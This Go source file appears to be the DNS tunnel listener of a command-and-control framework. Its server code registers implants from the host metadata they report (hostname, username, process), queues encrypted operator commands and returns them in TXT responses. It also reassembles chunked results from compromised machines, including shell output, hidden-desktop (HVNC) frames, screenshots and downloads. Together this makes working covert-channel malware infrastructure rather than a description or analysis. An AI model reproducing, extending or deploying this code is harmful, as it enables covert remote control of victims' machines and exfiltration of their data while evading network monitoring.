package dns

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"crypto/rand"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/miekg/dns"
)

// DNS 隧道 C2 监听器
// 协议设计：
//   客户端上行（请求命令/发送结果）: TXT 查询 <payload>.<type>.<seq>.<domain>
//   服务端下行（返回命令）: TXT 响应，值为 base32(encryptedCmd) 或空
//
//   标识统一用 uid（32 hex，单标签），避免超 253 字符 DNS 查询名上限。
//   type=mi: MetaInfo 注册（客户端分块上行加密 MetaInfo，服务端据此派生 uid/会话密钥并入库）
//   type=fb: FirstBlood（客户端上线确认）
//   type=pl: Pull（客户端轮询命令）
//   type=rs: Result（客户端回送结果）
//   type=hb: Heartbeat

// Listener 一个 DNS C2 监听器实例。原实现把这些状态全放在包级：多个 DNS 监听器会
// 共享客户端表与分块缓冲，后启动的还会覆盖先启动的域名/前缀，两者互相串数据。
// 现在每个实例一份。
type Listener struct {
	// addr 实际绑定的 UDP 地址；key 为登记用的监听器地址（listen_address）
	addr        string
	key         string
	packetConn  net.PacketConn
	dnsListener *dns.Server

	listenerDomain string
	dnsLabelPrefix string
	// masterKey / salt 本监听器的会话密钥派生材料（已归一化为 32/16 字节）。
	// 多实例下必须用实例自己的：按类型查库只能取到任意一行。
	masterKey []byte
	salt      []byte

	dnsClients     map[string]*dnsClientInfo // uid -> client info
	dnsClientsLock sync.RWMutex

	resultBuffers   map[string]dnsBufferEntry // uid -> result chunks（含时间戳用于过期清理）
	resultLock      sync.Mutex
	metaInfoBuffers map[string]dnsBufferEntry // uid -> MetaInfo 注册分块
	metaInfoLock    sync.Mutex

	dnsCleanerMu   sync.Mutex
	dnsCleanerStop chan struct{}

	stopOnce sync.Once
	stopped  atomic.Bool
}

// listeners 已启动的 DNS 监听器（key: listen_address），供按地址停止
var (
	listenersMu sync.Mutex
	listeners   = make(map[string]*Listener)
)

// XTerm/HVNC 会话广播函数，由 api 包在初始化时注入（nil 时 HandleClientReply 跳过）
var BroadcastToXTermSessions func(uid string, data []byte)
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// dnsBufferEntry DNS 分块缓冲条目（带最后更新时间，供过期清理）
type dnsBufferEntry struct {
	chunks   [][]byte
	lastSeen time.Time
}

// maxDNSChunks 分块数量上限，防止攻击者伪造 total 导致无界分配
const maxDNSChunks = 256

// maxDNSChunkSize 单个分块长度上限（base32/base64 编码后实际更短）
const maxDNSChunkSize = 512

// startDNSBufferCleaner 定期清理超时未完成的 DNS 分块缓冲（防止 map 无界增长）
func (l *Listener) startDNSBufferCleaner(stop chan struct{}) {
	go func() {
		for {
			select {
			case <-stop:
				return
			case <-time.After(60 * time.Second):
			}
			cutoff := time.Now().Add(-90 * time.Second)
			l.resultLock.Lock()
			for uid, entry := range l.resultBuffers {
				if entry.lastSeen.Before(cutoff) {
					delete(l.resultBuffers, uid)
				}
			}
			l.resultLock.Unlock()
			l.metaInfoLock.Lock()
			for uid, entry := range l.metaInfoBuffers {
				if entry.lastSeen.Before(cutoff) {
					delete(l.metaInfoBuffers, uid)
				}
			}
			l.metaInfoLock.Unlock()
			// 【安全修复】TTL 清理客户端缓存：离线检测器只清理已注册条目，
			// 防止异常路径残留的无主条目无限增长（注册客户端轮询间隔 ~10s，90s 阈值安全）
			l.dnsClientsLock.Lock()
			for uid, info := range l.dnsClients {
				if info.lastSeen.Before(cutoff) {
					delete(l.dnsClients, uid)
				}
			}
			l.dnsClientsLock.Unlock()
		}
	}()
}

type dnsClientInfo struct {
	uid         string
	listener    string
	ip          string
	lastSeen    time.Time
	lastDBWrite time.Time // 上次"在线状态写库"时间（节流用）
}

// stripLabelPrefix 去除查询名中的标签前缀（解析前还原内部标签）
func (l *Listener) stripLabelPrefix(tag string) string {
	if l.dnsLabelPrefix != "" && len(tag) > len(l.dnsLabelPrefix) && strings.HasPrefix(tag, l.dnsLabelPrefix) {
		return tag[len(l.dnsLabelPrefix):]
	}
	return tag
}

// Start 启动一个 DNS C2 监听器实例。
// key 用于登记/注销（即该监听器的 listen_address）；addr 是实际绑定的 UDP 地址；
// domain / labelPrefix 来自该监听器配置与 C2 Profile（客户端生成时 patch 同一前缀，两端必须一致）。
// onAbnormalExit 在服务循环非正常结束时回调（正常 Stop 不触发），由 api 层注入以回置
// 监听器状态——dns 包不反向依赖 api。
func Start(key, addr, domain, labelPrefix string, masterKey, salt []byte, onAbnormalExit func(reason string)) (*Listener, error) {
	l := &Listener{
		addr:            addr,
		key:             key,
		listenerDomain:  domain,
		dnsLabelPrefix:  labelPrefix,
		masterKey:       masterKey,
		salt:            salt,
		dnsClients:      make(map[string]*dnsClientInfo),
		resultBuffers:   make(map[string]dnsBufferEntry),
		metaInfoBuffers: make(map[string]dnsBufferEntry),
	}
	if l.listenerDomain == "" {
		l.listenerDomain = "dns.tshell."
	}
	if !strings.HasSuffix(l.listenerDomain, ".") {
		l.listenerDomain += "."
	}

	// 同步绑定 UDP：绑定失败要能返回给调用方（好让监听器状态落回已停止）。
	// 原实现把 ListenAndServe 放在 goroutine 里，失败只打日志，库里仍是"运行中"。
	pc, err := net.ListenPacket("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("DNS 端口绑定失败: %w", err)
	}
	l.packetConn = pc

	mux := dns.NewServeMux()
	mux.HandleFunc(l.listenerDomain, l.handleDNSRequest)
	l.dnsListener = &dns.Server{PacketConn: pc, Handler: mux}

	// 分块缓冲过期清理（每实例一个 goroutine）
	l.dnsCleanerMu.Lock()
	l.dnsCleanerStop = make(chan struct{})
	l.startDNSBufferCleaner(l.dnsCleanerStop)
	l.dnsCleanerMu.Unlock()

	listenersMu.Lock()
	listeners[key] = l
	listenersMu.Unlock()

	logx.Infof("🌐 [DNS监听器] 启动 DNS C2 隧道: %s, 域名: %s\n", addr, l.listenerDomain)
	go func() {
		err := l.dnsListener.ActivateAndServe()
		if l.stopped.Load() {
			return // 正常 Stop
		}
		// 服务循环自行退出（socket 故障等）：注销实例并回调回置状态，
		// 否则界面显示"监听中"、实际已不再应答查询
		reason := "DNS 服务循环异常退出"
		if err != nil {
			reason += ": " + err.Error()
		}
		listenersMu.Lock()
		if listeners[l.key] == l {
			delete(listeners, l.key)
		}
		listenersMu.Unlock()
		l.Stop() // 幂等：清理清理 goroutine 等资源
		logx.Errorf("❌ [DNS监听器] %s %s\n", l.key, reason)
		if onAbnormalExit != nil {
			onAbnormalExit(reason)
		}
	}()
	return l, nil
}

// Stop 停止该实例（幂等）
func (l *Listener) Stop() {
	l.stopOnce.Do(func() {
		l.stopped.Store(true)
		if l.dnsListener != nil {
			_ = l.dnsListener.Shutdown()
		}
		if l.packetConn != nil {
			_ = l.packetConn.Close() // Shutdown 已关闭时此处仅返回错误，忽略
		}
		l.dnsCleanerMu.Lock()
		if l.dnsCleanerStop != nil {
			close(l.dnsCleanerStop)
			l.dnsCleanerStop = nil
		}
		l.dnsCleanerMu.Unlock()
	})
}

// StopListener 停止并注销指定监听器实例（key 为 listen_address）；不存在时 no-op
func StopListener(key string) {
	listenersMu.Lock()
	l := listeners[key]
	delete(listeners, key)
	listenersMu.Unlock()
	if l != nil {
		l.Stop()
	}
}

// handleDNSRequest 处理 DNS 查询
func (l *Listener) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}

	q := r.Question[0]
	logx.Debugf("🔍 [DNS-REQ] type=%d name=%s\n", q.Qtype, q.Name)
	if q.Qtype != dns.TypeTXT {
		// 非 TXT 查询，返回空响应
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
		return
	}

	// 解析查询名: <payload>.<type>.<seq>.<domain>
	// rs/mi 格式: <chunk>.<idx_total>.<type>.<uid>.<domain>
	rest := strings.TrimSuffix(q.Name, ".")
	domainSuffix := strings.TrimSuffix(l.listenerDomain, ".")
	if strings.HasSuffix(rest, "."+domainSuffix) {
		rest = strings.TrimSuffix(rest, "."+domainSuffix)
	} else if strings.HasSuffix(rest, l.listenerDomain) {
		rest = strings.TrimSuffix(rest, l.listenerDomain)
	}
	parts := strings.Split(rest, ".")
	if len(parts) < 3 {
		// 格式不匹配，返回空
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
		return
	}

	msgType := l.stripLabelPrefix(parts[len(parts)-2]) // 倒数第二段是消息类型（含可配前缀）

	clientIP, _, _ := net.SplitHostPort(w.RemoteAddr().String())

	m := new(dns.Msg)
	m.SetReply(r)

	switch msgType {
	case "rs":
		// Result（chunk.idx_total.rs.uid 分标签）
		if len(parts) < 4 {
			w.WriteMsg(m)
			return
		}
		uid := strings.Join(parts[3:], "")
		l.handleResult(w, r, m, parts[0], parts[1], uid, clientIP)
	case "mi":
		// MetaInfo 注册（chunk.idx_total.mi.uid 分标签）
		if len(parts) < 4 {
			w.WriteMsg(m)
			return
		}
		uid := strings.Join(parts[3:], "")
		l.handleMetaInfo(w, r, m, parts[0], parts[1], uid, clientIP)
	default:
		// fb/pl/hb: 标识 = uid（32 hex，单标签），分标签重组
		uid := strings.Join(parts[:len(parts)-2], "")
		switch msgType {
		case "fb":
			l.handleFirstBlood(w, r, m, uid, clientIP)
		case "pl":
			l.handlePull(w, r, m, uid, clientIP)
		case "hb":
			l.handleHeartbeat(w, r, m, uid, clientIP)
		default:
			w.WriteMsg(m)
		}
	}
}

// handleFirstBlood 客户端上线确认（uid 直接作标识；注册/会话密钥在 mi 阶段完成）
func (l *Listener) handleFirstBlood(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
	if uid == "" {
		w.WriteMsg(m)
		return
	}
	l.updateClientOnline(uid)

	// 返回 success（加密）
	successData := []byte("success")
	encrypted, err := encrypt.EncryptWithSessionKey(successData, uid)
	if err != nil {
		w.WriteMsg(m)
		return
	}
	encoded := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(encrypted)
	setTXTReply(m, r, encoded)
	w.WriteMsg(m)
}

// registerClient 由解密后的 MetaInfo 推导 uid 并完成注册（会话密钥/映射/离线检测/数据库/通知）。
func (l *Listener) registerClient(metainfo []byte, clientIP string) string {
	// 【安全修复】与 TCP/KCP/WS 对齐的元数据长度校验（pid4+flag1+ip4+至少1字节OS信息），
	// 防止短 metainfo 触发 metainfo[:4]/[5:9] 切片越界 panic
	if len(metainfo) < 10 {
		logx.Warnf("⚠️ [DNS-METAINFO] metainfo 长度不足: %d\n", len(metainfo))
		return ""
	}
	uid := encrypt.BytesToMD5(metainfo)
	logx.Debugf("🔍 [DNS-METAINFO] uid=%s clientIP=%s metainfo_len=%d\n", uid, clientIP, len(metainfo))

	// 生成会话密钥（首次注册或重连协商；mi 分块重复调用由 HasPendingNonce 防重，
	// 防止派生覆盖唯一化后的密钥——派生/旋转都必须在同一次协商中原子完成）
	if encrypt.GlobalKeyManager != nil && !encrypt.HasPendingNonce(uid) {
		if _, err := encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, l.salt, l.masterKey, l.salt); err == nil {
			// 【会话密钥唯一化】重派生并暂存 nonce，待客户端首个轮询 pull 时下发
			nonce := make([]byte, 16)
			if _, err := rand.Read(nonce); err == nil {
				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, l.salt, l.masterKey, l.salt, nonce)
				if err != nil {
					logx.Warnf("⚠️ [DNS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
				} else {
					encrypt.StorePendingNonce(uid, &encrypt.PendingNonce{InitialKey: initialKey, Nonce: nonce})
					logx.Infof("🔑 [DNS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化完成，等待 pull 下发 nonce\n", uid)
				}
			}
		}
	}

	// 注册客户端
	connection.MuClientListenerType.Lock()
	connection.ClientListenerType[uid] = "dns"
	connection.MuClientListenerType.Unlock()

	l.dnsClientsLock.Lock()
	l.dnsClients[uid] = &dnsClientInfo{
		uid:      uid,
		listener: "dns",
		ip:       clientIP,
		lastSeen: time.Now(),
	}
	l.dnsClientsLock.Unlock()

	// 注册到统一离线检测器
	if connection.GlobalOfflineDetector != nil {
		_, hbInterval := database.GetListenerHeartbeatConfigByAddr(l.key, "dns")
		// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
		dnsMeta := strings.Split(string(metainfo[9:]), "\t")
		sleepSec := connection.ResolveSleepSeconds(dnsMeta, hbInterval)
		// 【优化】注册到统一连接池（DNS 无持久连接，conn 传 nil 仅占配额与统计）
		// 【幂等修复】重复 mi 注册只增 ActiveConnections 计数、误报"连接池已满"，
		// 已存在条目时仅刷新活动时间
		if connection.GlobalConnectionManager != nil {
			connID := "dns_" + uid
			if _, exists := connection.GlobalConnectionManager.GetConnection(connID); exists {
				connection.GlobalConnectionManager.UpdateConnectionActivity(connID, 0, 0)
			} else if err := connection.GlobalConnectionManager.AddConnection(connID, uid, "dns", clientIP, nil); err != nil {
				logx.Warnf("⚠️ [DNS] 连接池注册失败: %v\n", err)
			}
		}
		connection.GlobalOfflineDetector.Register(uid, "dns", sleepSec, func() {
			l.dnsClientsLock.Lock()
			delete(l.dnsClients, uid)
			l.dnsClientsLock.Unlock()
			// 离线时同步移除连接池条目
			if connection.GlobalConnectionManager != nil {
				connection.GlobalConnectionManager.RemoveConnection("dns_" + uid)
			}
		})
	}

	// 插入数据库
	var client database.Clients
	exists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
	if !exists {
		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])
		osArray := strings.Split(osInfo, "\t")

		hostname := ""
		username := ""
		procName := ""
		if len(osArray) > 0 {
			hostname = osArray[0]
		}
		if len(osArray) > 1 {
			username = osArray[1]
		}
		if len(osArray) > 2 {
			procName = osArray[2]
		}
		// B5: 记录批量命令能力(MetaInfo 第 6 段 "b1";旧客户端无此段恒 false)
		command.MarkBatchCapable(uid, command.ParseBatchCapability(osArray))

		if clientIP == "::1" {
			clientIP = "127.0.0.1"
		}
		address, _ := qqwry.GetLocationByIP(clientIP)

		arch := "x86"
		if flag > 8 {
			username += "*"
			flag -= 8
		}
		if flag > 4 {
			arch = "x64"
		}

		heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(l.key, "dns")
		_, insertErr := database.Engine.Insert(&database.Clients{
			Uid: uid, FirstStart: time.Now().Format("2006-01-02 15:04:05"),
			ExternalIP: clientIP, InternalIP: localIP,
			Username: username, Computer: hostname, Process: procName,
			Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch,
			Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: "dns",
			HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval,
		})
		if insertErr != nil {
			logx.Warnf("⚠️ [DNS-METAINFO] 插入客户端失败 uid=%s: %v\n", uid, insertErr)
		}
		database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
		database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
	}
	database.SetClientOnline(uid, "dns")

	// 通知
	if nm := notification.GetNotificationManager(); nm != nil {
		nm.OnClientOnline(uid)
	}
	return uid
}

// updateClientOnline 更新客户端在线状态（活动时间 + 离线检测 + 数据库）。
// dnsDBWriteInterval DNS 客户端在线状态写库节流间隔：
// DNS 每个查询（fb/pl/hb/rs）都会触发 updateClientOnline，原实现每查询写一次库，
// 高频轮询造成 WAL churn。仅当距上次写库超过该间隔（或首次出现）时才写库；
// 离线仍由统一离线检测器处理（Online:"2"）。
const dnsDBWriteInterval = 30 * time.Second

func (l *Listener) updateClientOnline(uid string) {
	now := time.Now()
	needDBWrite := false

	// 【安全修复】未认证 UID 防注入：fb/pl/hb 端点以裸 uid 标识，攻击者可喷洒随机
	// UID 无限增长客户端缓存。仅当 uid 已在本进程注册（或 DB 中已存在的真实客户端，
	// 覆盖服务端重启后重连场景）时才更新，否则直接拒绝。
	// DB 查询放在锁外执行，避免攻击者以随机 UID 触发查询持锁造成 DoS。
	l.dnsClientsLock.Lock()
	info, ok := l.dnsClients[uid]
	if ok {
		info.lastSeen = now
		if now.Sub(info.lastDBWrite) >= dnsDBWriteInterval {
			info.lastDBWrite = now
			needDBWrite = true
		}
	}
	l.dnsClientsLock.Unlock()

	if !ok {
		exists, _ := database.Engine.Where("uid = ?", uid).Exist(&database.Clients{})
		if !exists {
			return
		}
		l.dnsClientsLock.Lock()
		// 双重检查：DB 查询期间可能已注册，避免覆盖更完整的信息
		if info2, ok2 := l.dnsClients[uid]; ok2 {
			info2.lastSeen = now
			if now.Sub(info2.lastDBWrite) >= dnsDBWriteInterval {
				info2.lastDBWrite = now
				needDBWrite = true
			}
		} else {
			l.dnsClients[uid] = &dnsClientInfo{uid: uid, lastSeen: now, lastDBWrite: now}
			needDBWrite = true
		}
		l.dnsClientsLock.Unlock()
	}

	if connection.GlobalOfflineDetector != nil {
		connection.GlobalOfflineDetector.Touch(uid)
	}
	// 【优化】更新连接池活动时间，防止 idle 清理误杀 DNS 客户端（DNS 无持久连接）
	if connection.GlobalConnectionManager != nil {
		connection.GlobalConnectionManager.UpdateConnectionActivity("dns_"+uid, 0, 0)
	}
	if needDBWrite {
		// 心跳节流写库：仅置在线状态，不覆盖监听器归属
		database.SetClientOnline(uid, "")
	}
}

// handleMetaInfo 接收客户端分块上行的加密 MetaInfo，重组后注册客户端并派生会话密钥。
// 查询名: <chunk>.<idx_total>.mi.<uid>.<domain>
func (l *Listener) handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
	if chunk == "" || uid == "" {
		w.WriteMsg(m)
		return
	}

	// 解析分块信息 idx_total（total 上限校验，防止无界分配）
	var idx, total int
	fmt.Sscanf(chunkInfo, "%d_%d", &idx, &total)
	if total <= 0 || total > maxDNSChunks || idx < 0 || idx >= total {
		w.WriteMsg(m)
		return
	}
	if len(chunk) > maxDNSChunkSize {
		w.WriteMsg(m)
		return
	}

	// 聚合分块（重连时可能残留旧分块，按 total 重建）
	l.metaInfoLock.Lock()
	entry, ok := l.metaInfoBuffers[uid]
	if !ok || len(entry.chunks) != total {
		l.metaInfoBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
		entry = l.metaInfoBuffers[uid]
	}
	entry.chunks[idx] = []byte(chunk)
	entry.lastSeen = time.Now()
	complete := true
	for _, c := range entry.chunks {
		if len(c) == 0 {
			complete = false
			break
		}
	}
	l.metaInfoLock.Unlock()

	if !complete {
		// 等待其余分块
		setTXTReply(m, r, "ok")
		w.WriteMsg(m)
		return
	}

	// 全部到齐，组装
	l.metaInfoLock.Lock()
	parts := make([]string, total)
	for i, c := range l.metaInfoBuffers[uid].chunks {
		parts[i] = string(c)
	}
	delete(l.metaInfoBuffers, uid)
	l.metaInfoLock.Unlock()
	assembled := strings.Join(parts, "")

	// base32 -> base64 -> 解密 -> uid -> 注册
	raw, err := base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(assembled))
	if err != nil {
		w.WriteMsg(m)
		return
	}
	tmpMetainfo, err := encrypt.DecodeBase64(raw)
	if err != nil {
		w.WriteMsg(m)
		return
	}
	metaMK, metaSalt := l.masterKey, l.salt
	// J4: 拒绝公开默认密钥连接
	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
		logx.Warnf("⚠️ [DNS-METAINFO] 监听器使用公开默认密钥，拒绝注册\n")
		w.WriteMsg(m)
		return
	}
	metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
	if err != nil {
		w.WriteMsg(m)
		return
	}
	derivedUID := encrypt.BytesToMD5(metainfo)
	if derivedUID != uid {
		// 防标识伪造：查询名 uid 与 MetaInfo 推导不一致则拒绝
		logx.Warnf("⚠️ [DNS-METAINFO] uid 不匹配: query=%s derived=%s\n", uid, derivedUID)
		w.WriteMsg(m)
		return
	}
	l.registerClient(metainfo, clientIP)

	setTXTReply(m, r, "ok")
	w.WriteMsg(m)
}

// handlePull 处理客户端轮询命令
func (l *Listener) handlePull(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
	if uid == "" {
		// 无标识，无法确定客户端，返回空
		w.WriteMsg(m)
		return
	}

	// uid 直接作标识（不再每轮携带 MetaInfo）
	l.updateClientOnline(uid)

	// 【会话密钥唯一化】优先下发暂存的 nonce 协商消息（命令留待下轮）
	// 编码与命令下发一致：base32(密文)（BuildSessionNonceMsgWithKey 返回 base64，先解码回密文）
	if pending := encrypt.TakePendingNonce(uid); pending != nil {
		b64Payload := command.BuildSessionNonceMsgWithKey(pending.InitialKey, pending.Nonce)
		if b64Payload != nil {
			encryptedCmd, err := encrypt.DecodeBase64(b64Payload)
			if err == nil {
				encoded := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(encryptedCmd)
				setTXTReply(m, r, encoded)
				w.WriteMsg(m)
				logx.Infof("🔑 [DNS-PULL] 向客户端 %s 下发会话密钥 nonce\n", uid)
				return
			}
		}
	}

	// 检查命令队列(B5: 开关开启且客户端上报 b1 能力时批量打包,否则单条)
	var cmdBytes []byte
	var ok bool
	if cfg := config.GetGlobalConfig(); cfg != nil && cfg.HTTP.BatchCommands && command.IsBatchCapable(uid) {
		cmds := command.CommandQueues.GetCommands(uid, command.BatchMaxCount())
		if len(cmds) > 1 {
			cmdBytes = command.BuildBatchFrame(cmds)
			ok = cmdBytes != nil
		} else if len(cmds) == 1 {
			cmdBytes, ok = cmds[0], true
		}
	} else {
		cmdBytes, ok = command.CommandQueues.GetCommand(uid)
	}
	if !ok || len(cmdBytes) == 0 {
		// 无命令，返回空 TXT
		w.WriteMsg(m)
		return
	}

	// 加密命令
	encryptedCmd, err := encrypt.EncryptWithSessionKey(cmdBytes, uid)
	if err != nil {
		// 【加密体系改造】加密失败直接返回，不再回落旧加密
		w.WriteMsg(m)
		return
	}

	encoded := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(encryptedCmd)
	setTXTReply(m, r, encoded)
	w.WriteMsg(m)
}

// handleResult 处理客户端回送结果
func (l *Listener) handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
	if chunk == "" || uid == "" {
		w.WriteMsg(m)
		return
	}

	// uid 直接作标识（不再解密 MetaInfo）
	l.updateClientOnline(uid)

	// 解析分块信息 idx_total
	var idx, total int
	fmt.Sscanf(chunkInfo, "%d_%d", &idx, &total)
	if total <= 0 || total > maxDNSChunks || idx < 0 || idx >= total {
		w.WriteMsg(m)
		return
	}
	if len(chunk) > maxDNSChunkSize {
		w.WriteMsg(m)
		return
	}

	// 聚合分块
	l.resultLock.Lock()
	// 与 mi 聚合一致：缓冲长度必须匹配当前消息的 total，否则残留块（UDP 重传等）
	// 会污染新消息（误判完成/越界）。长度不符时丢弃重建。
	entry, ok := l.resultBuffers[uid]
	if !ok || len(entry.chunks) != total {
		l.resultBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
		entry = l.resultBuffers[uid]
	}
	entry.chunks[idx] = []byte(chunk)
	entry.lastSeen = time.Now()
	complete := true
	for _, c := range entry.chunks {
		if len(c) == 0 {
			complete = false
			break
		}
	}
	l.resultLock.Unlock()

	if !complete {
		// 等待其余分块
		setTXTReply(m, r, "ok")
		w.WriteMsg(m)
		return
	}

	// 全部到齐，组装
	l.resultLock.Lock()
	parts := make([]string, total)
	for i, c := range l.resultBuffers[uid].chunks {
		parts[i] = string(c)
	}
	delete(l.resultBuffers, uid)
	l.resultLock.Unlock()
	assembled := strings.Join(parts, "")

	// 解码 + 解密
	raw, err := base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(assembled))
	if err != nil {
		w.WriteMsg(m)
		return
	}
	dataBytes, err := encrypt.DecodeBase64(raw)
	if err != nil {
		w.WriteMsg(m)
		return
	}
	plain, err := encrypt.DecryptWithSessionKey(dataBytes, uid)
	if err != nil {
		// 【加密体系改造】解密失败直接返回，不再回落旧加密
		w.WriteMsg(m)
		return
	}
	// 客户端回包统一处理（四协议共用 pkg/command/reply_handlers.go，B4 收敛）：
	// 随之补齐 DNS 原缺失的 XTerm/31 错误回包/HVNC 实时广播、文件编辑、监控帧、
	// 下载与密钥轮换确认；DRIVES 补编码转换、SCREENSHOT1 补 data URI 前缀判定
	replyType, resultData, err := command.SplitReplyPayload(plain)
	if err != nil {
		logx.Warnf("⚠️ [DNS] %v, UID: %s\n", err, uid)
		w.WriteMsg(m)
		return
	}
	if err := command.HandleClientReply("dns", uid, replyType, resultData, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
		logx.Warnf("⚠️ [DNS] 处理回包失败 (type=%d): %v\n", replyType, err)
	}

	setTXTReply(m, r, "ok")
	w.WriteMsg(m)
}

// handleHeartbeat 处理心跳
func (l *Listener) handleHeartbeat(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
	if uid == "" {
		w.WriteMsg(m)
		return
	}
	// uid 直接作标识
	l.updateClientOnline(uid)

	setTXTReply(m, r, "ok")
	w.WriteMsg(m)
}

// setTXTReply 设置 TXT 响应
// setTXTReply 设置 TXT 响应。DNS TXT 单条上限 255 字节，超长数据拆分为多个 255 字节分片
// （客户端会聚合 Txt 全部分片），避免长命令/响应被截断损坏。
func setTXTReply(m, r *dns.Msg, value string) {
	txt := make([]string, 0, (len(value)+254)/255)
	for len(value) > 255 {
		txt = append(txt, value[:255])
		value = value[255:]
	}
	if len(value) > 0 {
		txt = append(txt, value)
	}
	rr := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Txt: txt,
	}
	m.Answer = append(m.Answer, rr)
}
